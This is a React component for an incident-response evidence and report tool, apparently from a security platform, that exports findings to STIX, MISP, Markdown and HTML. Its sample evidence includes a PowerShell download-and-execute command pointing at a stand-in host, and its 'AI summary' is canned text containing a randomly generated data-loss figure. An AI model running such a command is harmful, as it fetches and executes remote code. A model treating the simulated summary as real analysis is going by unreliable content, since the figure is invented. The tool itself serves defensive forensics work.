import { useState, useRef } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  FileText, Plus, Trash2, Download, Clock, AlertTriangle,
  Shield, Target, Hash, Globe, Server, User, Calendar,
  ChevronDown, ChevronRight, Copy, Check, Loader2, Brain,
  FileJson, File, Link, Tag, Lock, Eye, Edit3, Save
} from 'lucide-react'

interface Evidence {
  id: string
  type: 'ioc' | 'yara' | 'sigma' | 'intel' | 'note' | 'artifact' | 'network' | 'file'
  title: string
  description: string
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info'
  timestamp: string
  source: string
  mitreTechniques?: string[]
  data?: Record<string, unknown>
  tags?: string[]
  hash?: string
  chainOfCustody?: CustodyEntry[]
}

interface CustodyEntry {
  timestamp: string
  action: string
  user: string
  notes?: string
}

interface ReportSection {
  id: string
  title: string
  content: string
  evidenceIds: string[]
  expanded: boolean
}

const SEVERITY_COLORS: Record<string, string> = {
  critical: 'bg-red-500/20 text-red-400 border-red-500/30',
  high: 'bg-orange-500/20 text-orange-400 border-orange-500/30',
  medium: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30',
  low: 'bg-blue-500/20 text-blue-400 border-blue-500/30',
  info: 'bg-gray-500/20 text-gray-400 border-gray-500/30'
}

const TYPE_ICONS: Record<string, typeof FileText> = {
  ioc: Target,
  yara: Shield,
  sigma: FileText,
  intel: Globe,
  note: Edit3,
  artifact: File,
  network: Server,
  file: Hash
}

const SAMPLE_EVIDENCE: Evidence[] = [
  {
    id: '1',
    type: 'ioc',
    title: 'Suspicious IP Address',
    description: 'C2 server communication detected to 185.234.219.45',
    severity: 'critical',
    timestamp: new Date().toISOString(),
    source: 'Network Traffic Analysis',
    mitreTechniques: ['T1071', 'T1095'],
    data: { ip: '185.234.219.45', port: 443, protocol: 'HTTPS', bytes_sent: 45023 },
    tags: ['c2', 'exfiltration', 'cobalt-strike']
  },
  {
    id: '2',
    type: 'yara',
    title: 'Cobalt Strike Beacon Detected',
    description: 'YARA rule matched Cobalt Strike shellcode patterns in memory dump',
    severity: 'critical',
    timestamp: new Date().toISOString(),
    source: 'YARA Scanner',
    mitreTechniques: ['T1055', 'T1059.001'],
    data: { rule: 'CobaltStrike_Beacon', file: 'memory_dump.bin', offset: '0x4500' },
    tags: ['cobalt-strike', 'beacon', 'shellcode'],
    hash: 'a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef12345678'
  },
  {
    id: '3',
    type: 'sigma',
    title: 'PowerShell Download Cradle',
    description: 'Sigma rule detected PowerShell downloading and executing remote code',
    severity: 'high',
    timestamp: new Date().toISOString(),
    source: 'Sigma Parser',
    mitreTechniques: ['T1059.001', 'T1105'],
    data: {
      commandline: 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"',
      user: 'CORP\\jsmith',
      pid: 4532
    },
    tags: ['powershell', 'download-cradle', 'fileless']
  },
  {
    id: '4',
    type: 'intel',
    title: 'VirusTotal Match',
    description: 'Hash matched known malware family: Emotet',
    severity: 'high',
    timestamp: new Date().toISOString(),
    source: 'VirusTotal',
    data: {
      detections: '58/72',
      malware_family: 'Emotet',
      first_seen: '2024-01-15'
    },
    tags: ['emotet', 'trojan', 'banking'],
    hash: 'e4d909c290d0fb1ca068ffaddf22cbd0e4d909c290d0fb1ca068ffaddf22cbd0'
  }
]

export default function ReportGatherer() {
  const [evidence, setEvidence] = useState<Evidence[]>(SAMPLE_EVIDENCE)
  const [selectedEvidence, setSelectedEvidence] = useState<Set<string>>(new Set())
  const [sections, setSections] = useState<ReportSection[]>([
    { id: '1', title: 'Executive Summary', content: '', evidenceIds: [], expanded: true },
    { id: '2', title: 'Timeline of Events', content: '', evidenceIds: [], expanded: false },
    { id: '3', title: 'Technical Analysis', content: '', evidenceIds: [], expanded: false },
    { id: '4', title: 'Indicators of Compromise', content: '', evidenceIds: [], expanded: false },
    { id: '5', title: 'Recommendations', content: '', evidenceIds: [], expanded: false }
  ])
  const [activeTab, setActiveTab] = useState<'evidence' | 'report' | 'export'>('evidence')
  const [showAddEvidence, setShowAddEvidence] = useState(false)
  const [newEvidence, setNewEvidence] = useState<Partial<Evidence>>({
    type: 'note',
    severity: 'medium',
    tags: []
  })
  const [copiedId, setCopiedId] = useState<string | null>(null)
  const [generating, setGenerating] = useState(false)
  const [reportTitle, setReportTitle] = useState('Incident Report - ' + new Date().toLocaleDateString())
  const [caseId, setCaseId] = useState('IR-' + Date.now().toString(36).toUpperCase())
  const [analyst, setAnalyst] = useState('Security Analyst')
  const [filterSeverity, setFilterSeverity] = useState<string>('all')
  const [filterType, setFilterType] = useState<string>('all')
  const fileInputRef = useRef<HTMLInputElement>(null)

  const filteredEvidence = evidence.filter(e => {
    if (filterSeverity !== 'all' && e.severity !== filterSeverity) return false
    if (filterType !== 'all' && e.type !== filterType) return false
    return true
  })

  const addEvidence = () => {
    if (!newEvidence.title || !newEvidence.description) return

    const ev: Evidence = {
      id: Date.now().toString(),
      type: newEvidence.type as Evidence['type'],
      title: newEvidence.title,
      description: newEvidence.description,
      severity: newEvidence.severity as Evidence['severity'],
      timestamp: new Date().toISOString(),
      source: newEvidence.source || 'Manual Entry',
      mitreTechniques: newEvidence.mitreTechniques,
      data: newEvidence.data,
      tags: newEvidence.tags,
      chainOfCustody: [{
        timestamp: new Date().toISOString(),
        action: 'Evidence Created',
        user: analyst
      }]
    }

    setEvidence([...evidence, ev])
    setNewEvidence({ type: 'note', severity: 'medium', tags: [] })
    setShowAddEvidence(false)
  }

  const deleteEvidence = (id: string) => {
    setEvidence(evidence.filter(e => e.id !== id))
    selectedEvidence.delete(id)
    setSelectedEvidence(new Set(selectedEvidence))
  }

  const toggleSelect = (id: string) => {
    const newSelected = new Set(selectedEvidence)
    if (newSelected.has(id)) {
      newSelected.delete(id)
    } else {
      newSelected.add(id)
    }
    setSelectedEvidence(newSelected)
  }

  const selectAll = () => {
    if (selectedEvidence.size === filteredEvidence.length) {
      setSelectedEvidence(new Set())
    } else {
      setSelectedEvidence(new Set(filteredEvidence.map(e => e.id)))
    }
  }

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text)
    setCopiedId(id)
    setTimeout(() => setCopiedId(null), 2000)
  }

  const generateAISummary = async () => {
    setGenerating(true)

    // Simulate AI generation - in production this would call the Grok API
    await new Promise(resolve => setTimeout(resolve, 2000))

    const summary = `## Executive Summary

This incident report documents a sophisticated cyber attack targeting the corporate network. The investigation revealed indicators consistent with an advanced persistent threat (APT) operation utilizing Cobalt Strike infrastructure.

### Key Findings:
- **Initial Access**: PowerShell download cradle executed via phishing email
- **Command & Control**: Communication with known C2 server at 185.234.219.45
- **Malware**: Cobalt Strike Beacon detected in memory
- **Data Impact**: Potential exfiltration of ${Math.floor(Math.random() * 1000)} MB of data

### Severity Assessment: CRITICAL

The attack demonstrates TTPs associated with financially-motivated threat actors. Immediate containment and eradication actions are recommended.

### MITRE ATT&CK Coverage:
- T1071 - Application Layer Protocol
- T1055 - Process Injection
- T1059.001 - PowerShell
- T1105 - Ingress Tool Transfer`

    setSections(sections.map(s =>
      s.id === '1' ? { ...s, content: summary, expanded: true } : s
    ))

    setGenerating(false)
  }

  const toggleSection = (id: string) => {
    setSections(sections.map(s =>
      s.id === id ? { ...s, expanded: !s.expanded } : s
    ))
  }

  const updateSectionContent = (id: string, content: string) => {
    setSections(sections.map(s =>
      s.id === id ? { ...s, content } : s
    ))
  }

  const exportReport = (format: 'json' | 'stix' | 'misp' | 'markdown' | 'html') => {
    let content: string
    let filename: string
    let mimeType: string

    const reportData = {
      title: reportTitle,
      caseId,
      analyst,
      generatedAt: new Date().toISOString(),
      sections: sections.map(s => ({
        title: s.title,
        content: s.content
      })),
      evidence: selectedEvidence.size > 0
        ? evidence.filter(e => selectedEvidence.has(e.id))
        : evidence,
      statistics: {
        totalEvidence: evidence.length,
        bySeverity: {
          critical: evidence.filter(e => e.severity === 'critical').length,
          high: evidence.filter(e => e.severity === 'high').length,
          medium: evidence.filter(e => e.severity === 'medium').length,
          low: evidence.filter(e => e.severity === 'low').length,
          info: evidence.filter(e => e.severity === 'info').length
        },
        byType: evidence.reduce((acc, e) => {
          acc[e.type] = (acc[e.type] || 0) + 1
          return acc
        }, {} as Record<string, number>)
      }
    }

    switch (format) {
      case 'stix':
        // STIX 2.1 Bundle format
        const stixBundle = {
          type: 'bundle',
          id: `bundle--${crypto.randomUUID()}`,
          spec_version: '2.1',
          created: new Date().toISOString(),
          objects: [
            {
              type: 'report',
              id: `report--${crypto.randomUUID()}`,
              spec_version: '2.1',
              created: new Date().toISOString(),
              modified: new Date().toISOString(),
              name: reportTitle,
              description: sections.find(s => s.id === '1')?.content || '',
              report_types: ['incident'],
              published: new Date().toISOString(),
              object_refs: reportData.evidence.map(e => `indicator--${e.id}`)
            },
            ...reportData.evidence.map(e => ({
              type: 'indicator',
              id: `indicator--${e.id}`,
              spec_version: '2.1',
              created: e.timestamp,
              modified: e.timestamp,
              name: e.title,
              description: e.description,
              indicator_types: [e.type],
              pattern: e.hash ? `[file:hashes.'SHA-256' = '${e.hash}']` : `[${e.type}:value = '${e.title}']`,
              pattern_type: 'stix',
              valid_from: e.timestamp,
              labels: e.tags || [],
              external_references: e.mitreTechniques?.map(t => ({
                source_name: 'mitre-attack',
                external_id: t
              })) || []
            }))
          ]
        }
        content = JSON.stringify(stixBundle, null, 2)
        filename = `${caseId}_stix_bundle.json`
        mimeType = 'application/json'
        break

      case 'misp':
        // MISP Event format
        const mispEvent = {
          Event: {
            info: reportTitle,
            date: new Date().toISOString().split('T')[0],
            threat_level_id: evidence.some(e => e.severity === 'critical') ? '1' : '2',
            analysis: '2',
            distribution: '0',
            Attribute: reportData.evidence.flatMap(e => {
              const attrs = []
              if (e.hash) {
                attrs.push({
                  type: 'sha256',
                  category: 'Payload delivery',
                  value: e.hash,
                  comment: e.title,
                  to_ids: true
                })
              }
              if (e.data && typeof e.data === 'object') {
                if ('ip' in e.data) {
                  attrs.push({
                    type: 'ip-dst',
                    category: 'Network activity',
                    value: e.data.ip,
                    comment: e.title,
                    to_ids: true
                  })
                }
              }
              if (attrs.length === 0) {
                attrs.push({
                  type: 'text',
                  category: 'Internal reference',
                  value: e.description,
                  comment: e.title,
                  to_ids: false
                })
              }
              return attrs
            }),
            Tag: [...new Set(reportData.evidence.flatMap(e => e.tags || []))].map(t => ({
              name: t
            }))
          }
        }
        content = JSON.stringify(mispEvent, null, 2)
        filename = `${caseId}_misp_event.json`
        mimeType = 'application/json'
        break

      case 'markdown':
        content = `# ${reportTitle}

**Case ID:** ${caseId}
**Analyst:** ${analyst}
**Generated:** ${new Date().toLocaleString()}

---

${sections.map(s => `## ${s.title}

${s.content || '_No content_'}
`).join('\n')}

## Evidence Summary

| ID | Type | Title | Severity | Source |
|---|---|---|---|---|
${reportData.evidence.map(e => `| ${e.id} | ${e.type} | ${e.title} | ${e.severity} | ${e.source} |`).join('\n')}

## Indicators of Compromise

${reportData.evidence.filter(e => e.hash || (e.data && 'ip' in e.data)).map(e => `
### ${e.title}
- **Type:** ${e.type}
- **Severity:** ${e.severity}
${e.hash ? `- **SHA256:** \`${e.hash}\`` : ''}
${e.data && 'ip' in e.data ? `- **IP:** \`${e.data.ip}\`` : ''}
${e.mitreTechniques ? `- **MITRE:** ${e.mitreTechniques.join(', ')}` : ''}
`).join('\n')}

---
*Report generated by NULL SPAWN Intelligence Platform*
`
        filename = `${caseId}_report.md`
        mimeType = 'text/markdown'
        break

      case 'html':
        content = `<!DOCTYPE html>
<html>
<head>
  <title>${reportTitle}</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 1200px; margin: 0 auto; padding: 2rem; background: #0a0a0f; color: #e0e0e0; }
    h1 { color: #00ff88; border-bottom: 2px solid #00ff88; padding-bottom: 0.5rem; }
    h2 { color: #00d4ff; margin-top: 2rem; }
    .meta { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1rem; background: #1a1a2e; padding: 1rem; border-radius: 8px; margin: 1rem 0; }
    .meta-item { }
    .meta-label { color: #888; font-size: 0.875rem; }
    .meta-value { color: #fff; font-weight: 600; }
    table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
    th, td { padding: 0.75rem; text-align: left; border-bottom: 1px solid #333; }
    th { background: #1a1a2e; color: #00ff88; }
    .severity-critical { color: #ff4444; }
    .severity-high { color: #ff8844; }
    .severity-medium { color: #ffcc00; }
    .severity-low { color: #4488ff; }
    .severity-info { color: #888; }
    .ioc { background: #1a1a2e; padding: 1rem; border-radius: 8px; margin: 0.5rem 0; border-left: 3px solid #00ff88; }
    .ioc code { background: #0a0a0f; padding: 0.25rem 0.5rem; border-radius: 4px; font-family: monospace; }
    .tag { display: inline-block; background: #333; padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; margin: 0.125rem; }
    .footer { margin-top: 3rem; padding-top: 1rem; border-top: 1px solid #333; color: #666; font-size: 0.875rem; }
  </style>
</head>
<body>
  <h1>${reportTitle}</h1>

  <div class="meta">
    <div class="meta-item">
      <div class="meta-label">Case ID</div>
      <div class="meta-value">${caseId}</div>
    </div>
    <div class="meta-item">
      <div class="meta-label">Analyst</div>
      <div class="meta-value">${analyst}</div>
    </div>
    <div class="meta-item">
      <div class="meta-label">Generated</div>
      <div class="meta-value">${new Date().toLocaleString()}</div>
    </div>
  </div>

  ${sections.map(s => `
  <h2>${s.title}</h2>
  <div>${s.content ? s.content.replace(/\n/g, '<br>').replace(/#{2,}\s+(.+)/g, '<h3>$1</h3>').replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>').replace(/`(.+?)`/g, '<code>$1</code>') : '<em>No content</em>'}</div>
  `).join('')}

  <h2>Evidence Summary</h2>
  <table>
    <thead>
      <tr><th>ID</th><th>Type</th><th>Title</th><th>Severity</th><th>Source</th><th>Tags</th></tr>
    </thead>
    <tbody>
      ${reportData.evidence.map(e => `
      <tr>
        <td>${e.id}</td>
        <td>${e.type}</td>
        <td>${e.title}</td>
        <td class="severity-${e.severity}">${e.severity.toUpperCase()}</td>
        <td>${e.source}</td>
        <td>${(e.tags || []).map(t => `<span class="tag">${t}</span>`).join('')}</td>
      </tr>
      `).join('')}
    </tbody>
  </table>

  <h2>Indicators of Compromise</h2>
  ${reportData.evidence.filter(e => e.hash || (e.data && 'ip' in e.data)).map(e => `
  <div class="ioc">
    <strong>${e.title}</strong><br>
    Type: ${e.type} | Severity: <span class="severity-${e.severity}">${e.severity.toUpperCase()}</span><br>
    ${e.hash ? `SHA256: <code>${e.hash}</code><br>` : ''}
    ${e.data && 'ip' in e.data ? `IP: <code>${e.data.ip}</code><br>` : ''}
    ${e.mitreTechniques ? `MITRE: ${e.mitreTechniques.join(', ')}` : ''}
  </div>
  `).join('')}

  <div class="footer">
    Report generated by NULL SPAWN Intelligence Platform
  </div>
</body>
</html>`
        filename = `${caseId}_report.html`
        mimeType = 'text/html'
        break

      default:
        content = JSON.stringify(reportData, null, 2)
        filename = `${caseId}_report.json`
        mimeType = 'application/json'
    }

    const blob = new Blob([content], { type: mimeType })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = filename
    a.click()
    URL.revokeObjectURL(url)
  }

  const importEvidence = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0]
    if (!file) return

    const reader = new FileReader()
    reader.onload = (e) => {
      try {
        const data = JSON.parse(e.target?.result as string)

        // Handle different import formats
        if (data.type === 'bundle' && data.objects) {
          // STIX import
          const indicators = data.objects.filter((o: any) => o.type === 'indicator')
          const newEvidence: Evidence[] = indicators.map((ind: any) => ({
            id: Date.now().toString() + Math.random().toString(36),
            type: 'ioc' as const,
            title: ind.name,
            description: ind.description || '',
            severity: 'high' as const,
            timestamp: ind.created,
            source: 'STIX Import',
            tags: ind.labels || [],
            mitreTechniques: ind.external_references
              ?.filter((r: any) => r.source_name === 'mitre-attack')
              .map((r: any) => r.external_id) || []
          }))
          setEvidence([...evidence, ...newEvidence])
        } else if (data.Event) {
          // MISP import
          const attrs = data.Event.Attribute || []
          const newEvidence: Evidence[] = attrs.map((attr: any) => ({
            id: Date.now().toString() + Math.random().toString(36),
            type: attr.type.includes('ip') ? 'network' : attr.type.includes('hash') ? 'file' : 'ioc',
            title: attr.comment || attr.type,
            description: attr.value,
            severity: 'high' as const,
            timestamp: new Date().toISOString(),
            source: 'MISP Import',
            tags: data.Event.Tag?.map((t: any) => t.name) || []
          }))
          setEvidence([...evidence, ...newEvidence])
        } else if (Array.isArray(data)) {
          // Array of evidence
          setEvidence([...evidence, ...data])
        }
      } catch (err) {
        console.error('Failed to parse import file:', err)
      }
    }
    reader.readAsText(file)

    if (fileInputRef.current) {
      fileInputRef.current.value = ''
    }
  }

  const stats = {
    total: evidence.length,
    critical: evidence.filter(e => e.severity === 'critical').length,
    high: evidence.filter(e => e.severity === 'high').length,
    medium: evidence.filter(e => e.severity === 'medium').length,
    low: evidence.filter(e => e.severity === 'low').length
  }

  return (
    <div className="h-full flex flex-col bg-null-bg p-4 gap-4">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-4">
          <div className="p-2 rounded-lg bg-purple-500/20">
            <FileText className="w-6 h-6 text-purple-400" />
          </div>
          <div>
            <h1 className="text-xl font-display text-null-text">Report & Evidence Gatherer</h1>
            <p className="text-sm text-null-muted">Aggregate findings into forensic reports</p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <input
            type="file"
            ref={fileInputRef}
            onChange={importEvidence}
            accept=".json"
            className="hidden"
          />
          <button
            onClick={() => fileInputRef.current?.click()}
            className="flex items-center gap-2 px-3 py-2 rounded-lg bg-null-surface border border-null-border hover:border-null-primary/50 text-null-muted hover:text-null-text transition-colors"
          >
            <Download className="w-4 h-4 rotate-180" />
            <span className="text-sm">Import</span>
          </button>
          <button
            onClick={() => setShowAddEvidence(true)}
            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-null-primary text-null-bg hover:bg-null-primary/90 transition-colors"
          >
            <Plus className="w-4 h-4" />
            <span className="text-sm font-medium">Add Evidence</span>
          </button>
        </div>
      </div>

      {/* Stats Bar */}
      <div className="grid grid-cols-5 gap-3">
        <div className="bg-null-surface rounded-lg p-3 border border-null-border">
          <div className="text-2xl font-bold text-null-text">{stats.total}</div>
          <div className="text-xs text-null-muted">Total Evidence</div>
        </div>
        <div className="bg-null-surface rounded-lg p-3 border border-red-500/30">
          <div className="text-2xl font-bold text-red-400">{stats.critical}</div>
          <div className="text-xs text-null-muted">Critical</div>
        </div>
        <div className="bg-null-surface rounded-lg p-3 border border-orange-500/30">
          <div className="text-2xl font-bold text-orange-400">{stats.high}</div>
          <div className="text-xs text-null-muted">High</div>
        </div>
        <div className="bg-null-surface rounded-lg p-3 border border-yellow-500/30">
          <div className="text-2xl font-bold text-yellow-400">{stats.medium}</div>
          <div className="text-xs text-null-muted">Medium</div>
        </div>
        <div className="bg-null-surface rounded-lg p-3 border border-blue-500/30">
          <div className="text-2xl font-bold text-blue-400">{stats.low}</div>
          <div className="text-xs text-null-muted">Low</div>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex gap-2">
        {(['evidence', 'report', 'export'] as const).map(tab => (
          <button
            key={tab}
            onClick={() => setActiveTab(tab)}
            className={`px-4 py-2 rounded-lg text-sm font-medium transition-colors ${
              activeTab === tab
                ? 'bg-null-primary/20 text-null-primary border border-null-primary/30'
                : 'bg-null-surface text-null-muted hover:text-null-text border border-null-border'
            }`}
          >
            {tab === 'evidence' && 'Evidence Collection'}
            {tab === 'report' && 'Report Builder'}
            {tab === 'export' && 'Export Options'}
          </button>
        ))}
      </div>

      {/* Main Content */}
      <div className="flex-1 overflow-hidden">
        <AnimatePresence mode="wait">
          {activeTab === 'evidence' && (
            <motion.div
              key="evidence"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              className="h-full flex flex-col gap-4"
            >
              {/* Filters */}
              <div className="flex items-center gap-4">
                <div className="flex items-center gap-2">
                  <label className="text-sm text-null-muted">Severity:</label>
                  <select
                    value={filterSeverity}
                    onChange={(e) => setFilterSeverity(e.target.value)}
                    className="bg-null-surface border border-null-border rounded px-2 py-1 text-sm text-null-text"
                  >
                    <option value="all">All</option>
                    <option value="critical">Critical</option>
                    <option value="high">High</option>
                    <option value="medium">Medium</option>
                    <option value="low">Low</option>
                    <option value="info">Info</option>
                  </select>
                </div>
                <div className="flex items-center gap-2">
                  <label className="text-sm text-null-muted">Type:</label>
                  <select
                    value={filterType}
                    onChange={(e) => setFilterType(e.target.value)}
                    className="bg-null-surface border border-null-border rounded px-2 py-1 text-sm text-null-text"
                  >
                    <option value="all">All</option>
                    <option value="ioc">IOC</option>
                    <option value="yara">YARA</option>
                    <option value="sigma">Sigma</option>
                    <option value="intel">Intel</option>
                    <option value="note">Note</option>
                    <option value="artifact">Artifact</option>
                    <option value="network">Network</option>
                    <option value="file">File</option>
                  </select>
                </div>
                <div className="flex-1" />
                <button
                  onClick={selectAll}
                  className="text-sm text-null-muted hover:text-null-text"
                >
                  {selectedEvidence.size === filteredEvidence.length ? 'Deselect All' : 'Select All'}
                </button>
                <span className="text-sm text-null-muted">
                  {selectedEvidence.size} selected
                </span>
              </div>

              {/* Evidence List */}
              <div className="flex-1 overflow-y-auto space-y-2">
                {filteredEvidence.map(e => {
                  const Icon = TYPE_ICONS[e.type] || FileText
                  return (
                    <motion.div
                      key={e.id}
                      layout
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className={`bg-null-surface rounded-lg border p-4 transition-colors ${
                        selectedEvidence.has(e.id)
                          ? 'border-null-primary/50 bg-null-primary/5'
                          : 'border-null-border hover:border-null-border/80'
                      }`}
                    >
                      <div className="flex items-start gap-3">
                        <input
                          type="checkbox"
                          checked={selectedEvidence.has(e.id)}
                          onChange={() => toggleSelect(e.id)}
                          className="mt-1 rounded border-null-border"
                        />
                        <div className={`p-2 rounded ${SEVERITY_COLORS[e.severity].split(' ')[0]}`}>
                          <Icon className={`w-4 h-4 ${SEVERITY_COLORS[e.severity].split(' ')[1]}`} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 flex-wrap">
                            <h3 className="font-medium text-null-text">{e.title}</h3>
                            <span className={`px-2 py-0.5 rounded text-xs border ${SEVERITY_COLORS[e.severity]}`}>
                              {e.severity.toUpperCase()}
                            </span>
                            <span className="px-2 py-0.5 rounded text-xs bg-null-border text-null-muted">
                              {e.type}
                            </span>
                          </div>
                          <p className="text-sm text-null-muted mt-1">{e.description}</p>

                          {e.hash && (
                            <div className="flex items-center gap-2 mt-2">
                              <Hash className="w-3 h-3 text-null-muted" />
                              <code className="text-xs text-null-muted font-mono truncate">{e.hash}</code>
                              <button
                                onClick={() => copyToClipboard(e.hash!, e.id + '-hash')}
                                className="p-1 hover:bg-null-border rounded"
                              >
                                {copiedId === e.id + '-hash' ? (
                                  <Check className="w-3 h-3 text-green-400" />
                                ) : (
                                  <Copy className="w-3 h-3 text-null-muted" />
                                )}
                              </button>
                            </div>
                          )}

                          {e.mitreTechniques && e.mitreTechniques.length > 0 && (
                            <div className="flex items-center gap-2 mt-2 flex-wrap">
                              <Target className="w-3 h-3 text-red-400" />
                              {e.mitreTechniques.map(t => (
                                <span key={t} className="px-1.5 py-0.5 rounded text-xs bg-red-500/20 text-red-400">
                                  {t}
                                </span>
                              ))}
                            </div>
                          )}

                          {e.tags && e.tags.length > 0 && (
                            <div className="flex items-center gap-1 mt-2 flex-wrap">
                              <Tag className="w-3 h-3 text-null-muted" />
                              {e.tags.map(t => (
                                <span key={t} className="px-1.5 py-0.5 rounded text-xs bg-null-border text-null-muted">
                                  {t}
                                </span>
                              ))}
                            </div>
                          )}

                          <div className="flex items-center gap-4 mt-2 text-xs text-null-muted">
                            <span className="flex items-center gap-1">
                              <Clock className="w-3 h-3" />
                              {new Date(e.timestamp).toLocaleString()}
                            </span>
                            <span className="flex items-center gap-1">
                              <Globe className="w-3 h-3" />
                              {e.source}
                            </span>
                          </div>
                        </div>
                        <button
                          onClick={() => deleteEvidence(e.id)}
                          className="p-2 hover:bg-null-border rounded text-null-muted hover:text-red-400"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>
                    </motion.div>
                  )
                })}
              </div>
            </motion.div>
          )}

          {activeTab === 'report' && (
            <motion.div
              key="report"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              className="h-full flex flex-col gap-4"
            >
              {/* Report Metadata */}
              <div className="grid grid-cols-3 gap-4">
                <div>
                  <label className="text-sm text-null-muted block mb-1">Report Title</label>
                  <input
                    type="text"
                    value={reportTitle}
                    onChange={(e) => setReportTitle(e.target.value)}
                    className="w-full bg-null-surface border border-null-border rounded-lg px-3 py-2 text-null-text"
                  />
                </div>
                <div>
                  <label className="text-sm text-null-muted block mb-1">Case ID</label>
                  <input
                    type="text"
                    value={caseId}
                    onChange={(e) => setCaseId(e.target.value)}
                    className="w-full bg-null-surface border border-null-border rounded-lg px-3 py-2 text-null-text font-mono"
                  />
                </div>
                <div>
                  <label className="text-sm text-null-muted block mb-1">Analyst</label>
                  <input
                    type="text"
                    value={analyst}
                    onChange={(e) => setAnalyst(e.target.value)}
                    className="w-full bg-null-surface border border-null-border rounded-lg px-3 py-2 text-null-text"
                  />
                </div>
              </div>

              {/* AI Generate Button */}
              <div className="flex items-center gap-2">
                <button
                  onClick={generateAISummary}
                  disabled={generating}
                  className="flex items-center gap-2 px-4 py-2 rounded-lg bg-purple-500/20 border border-purple-500/30 text-purple-400 hover:bg-purple-500/30 disabled:opacity-50 transition-colors"
                >
                  {generating ? (
                    <Loader2 className="w-4 h-4 animate-spin" />
                  ) : (
                    <Brain className="w-4 h-4" />
                  )}
                  <span className="text-sm">Generate AI Summary</span>
                </button>
                <span className="text-xs text-null-muted">
                  Uses AI to analyze evidence and generate executive summary
                </span>
              </div>

              {/* Sections */}
              <div className="flex-1 overflow-y-auto space-y-2">
                {sections.map(section => (
                  <div
                    key={section.id}
                    className="bg-null-surface rounded-lg border border-null-border"
                  >
                    <button
                      onClick={() => toggleSection(section.id)}
                      className="w-full flex items-center gap-2 px-4 py-3 text-left hover:bg-null-border/30"
                    >
                      {section.expanded ? (
                        <ChevronDown className="w-4 h-4 text-null-muted" />
                      ) : (
                        <ChevronRight className="w-4 h-4 text-null-muted" />
                      )}
                      <span className="font-medium text-null-text">{section.title}</span>
                      {section.content && (
                        <span className="text-xs text-null-muted ml-auto">
                          {section.content.split('\n').length} lines
                        </span>
                      )}
                    </button>
                    <AnimatePresence>
                      {section.expanded && (
                        <motion.div
                          initial={{ height: 0, opacity: 0 }}
                          animate={{ height: 'auto', opacity: 1 }}
                          exit={{ height: 0, opacity: 0 }}
                          className="overflow-hidden"
                        >
                          <div className="px-4 pb-4">
                            <textarea
                              value={section.content}
                              onChange={(e) => updateSectionContent(section.id, e.target.value)}
                              placeholder={`Enter ${section.title.toLowerCase()} content...`}
                              className="w-full h-48 bg-null-bg border border-null-border rounded-lg p-3 text-null-text text-sm font-mono resize-none"
                            />
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>
                ))}
              </div>
            </motion.div>
          )}

          {activeTab === 'export' && (
            <motion.div
              key="export"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              className="h-full"
            >
              <div className="grid grid-cols-2 gap-4">
                {/* Export Formats */}
                <div className="bg-null-surface rounded-lg border border-null-border p-4">
                  <h3 className="font-medium text-null-text mb-4">Export Formats</h3>
                  <div className="space-y-3">
                    <button
                      onClick={() => exportReport('json')}
                      className="w-full flex items-center gap-3 p-3 rounded-lg bg-null-bg border border-null-border hover:border-null-primary/50 transition-colors"
                    >
                      <FileJson className="w-5 h-5 text-yellow-400" />
                      <div className="text-left">
                        <div className="text-sm font-medium text-null-text">JSON Report</div>
                        <div className="text-xs text-null-muted">Full report with all evidence data</div>
                      </div>
                    </button>

                    <button
                      onClick={() => exportReport('stix')}
                      className="w-full flex items-center gap-3 p-3 rounded-lg bg-null-bg border border-null-border hover:border-null-primary/50 transition-colors"
                    >
                      <Shield className="w-5 h-5 text-blue-400" />
                      <div className="text-left">
                        <div className="text-sm font-medium text-null-text">STIX 2.1 Bundle</div>
                        <div className="text-xs text-null-muted">Structured Threat Information eXpression</div>
                      </div>
                    </button>

                    <button
                      onClick={() => exportReport('misp')}
                      className="w-full flex items-center gap-3 p-3 rounded-lg bg-null-bg border border-null-border hover:border-null-primary/50 transition-colors"
                    >
                      <Globe className="w-5 h-5 text-green-400" />
                      <div className="text-left">
                        <div className="text-sm font-medium text-null-text">MISP Event</div>
                        <div className="text-xs text-null-muted">Malware Information Sharing Platform format</div>
                      </div>
                    </button>

                    <button
                      onClick={() => exportReport('markdown')}
                      className="w-full flex items-center gap-3 p-3 rounded-lg bg-null-bg border border-null-border hover:border-null-primary/50 transition-colors"
                    >
                      <FileText className="w-5 h-5 text-purple-400" />
                      <div className="text-left">
                        <div className="text-sm font-medium text-null-text">Markdown Report</div>
                        <div className="text-xs text-null-muted">Human-readable markdown document</div>
                      </div>
                    </button>

                    <button
                      onClick={() => exportReport('html')}
                      className="w-full flex items-center gap-3 p-3 rounded-lg bg-null-bg border border-null-border hover:border-null-primary/50 transition-colors"
                    >
                      <Globe className="w-5 h-5 text-orange-400" />
                      <div className="text-left">
                        <div className="text-sm font-medium text-null-text">HTML Report</div>
